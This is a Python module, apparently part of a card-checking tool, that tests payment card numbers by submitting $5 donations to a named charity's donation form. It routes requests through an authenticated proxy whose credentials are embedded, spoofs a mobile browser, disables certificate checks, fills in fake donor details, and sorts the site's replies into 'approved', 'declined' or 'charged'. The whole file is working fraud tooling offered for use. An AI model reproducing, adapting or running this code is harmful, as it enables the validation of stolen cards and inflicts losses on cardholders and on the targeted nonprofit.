import requests
import re
import urllib3

# Disable SSL warnings for cleaner output
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TARGET_URL = 'https://happyhillfarm.org/donate/process.php'

# PROXY CONFIGURATION
PROXY_URL = "http://5K05CT880J2D:VE1MSDRGFDZB@37.218.219.8:5433"
PROXIES = {
    'http': PROXY_URL,
    'https': PROXY_URL
}

# Static Payload Data
STATIC_DATA = {
    'offer': 'main-donate',
    'js_on': '2026',
    'appealCode': '',
    'amount': '5',
    'giftFrequency': 'one-time',
    'firstName': 'Rocky',
    'lastName': 'og',
    'spouseName': '',
    'emailAddress': 'malcjaviusstorm@gmail.com',
    'address1': '15th street',
    'address2': '',
    'city': 'new york',
    'state': 'NY',
    'zip': '10080',
    'comments': '',
    'cardType': 'VISA',
    'typeOfHonor': '0',
    'honorTitle': '',
    'honorFirstName': '',
    'honorLastName': '',
    'cardTitle': '',
    'cardFirstName': '',
    'cardLastName': '',
    'cardAddress1': '',
    'cardAddress2': '',
    'cardCity': '',
    'cardState': 'AL',
    'cardZip': '',
    'website': '',
    'submit': 'Give Now →',
}

HEADERS = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://happyhillfarm.org',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://happyhillfarm.org/donate/index.php',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36',
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def extract_error_message(html_content):
    """Extracts the specific error message from the HTML response."""
    pattern = r"Error Message:(.*?)</i>"
    match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

def process_card(cc, mm, yy, cvv):
    """
    Sends a request for a single card using the PROXY and returns a JSON dict.
    This is the function imported by py.py
    """
    
    payload = STATIC_DATA.copy()
    payload['cardNumber'] = cc
    payload['expMonth'] = mm
    payload['expYear'] = yy
    payload['cardCSC'] = cvv

    try:
        response = requests.post(
            TARGET_URL, 
            headers=HEADERS, 
            data=payload, 
            proxies=PROXIES, 
            timeout=30,
            verify=False
        )
        
        # Extract the message
        message = extract_error_message(response.text)
        
        # Determine Status
        status = ""
        response_text = ""
        
        if message:
            # Check if message contains CVV2 -> Approved
            if "CVV2" in message.upper():
                status = "approved"
                response_text = message
            # Otherwise -> Declined
            else:
                status = "declined"
                response_text = message
        else:
            # No error message found -> Charged
            status = "charged"
            response_text = "Payment Approved"
            
        return {
            "status": status,
            "response": response_text
        }

    except Exception as e:
        # Handle any connection/proxy errors
        print(f"[PayFlow Error] {e}")
        return {
            "status": "error",
            "response": "Error Occurred"
        }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN EXECUTION (For standalone testing)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
if __name__ == "__main__":
    # This allows you to run python payflow.py manually to test
    print("PayFlow Standalone Test")
    test_cc = input("Enter CC (format: cc|mm|yy|cvv): ")
    parts = test_cc.split('|')
    if len(parts) == 4:
        res = process_card(parts[0], parts[1], parts[2], parts[3])
        print(res)
    else:
        print("Invalid format")
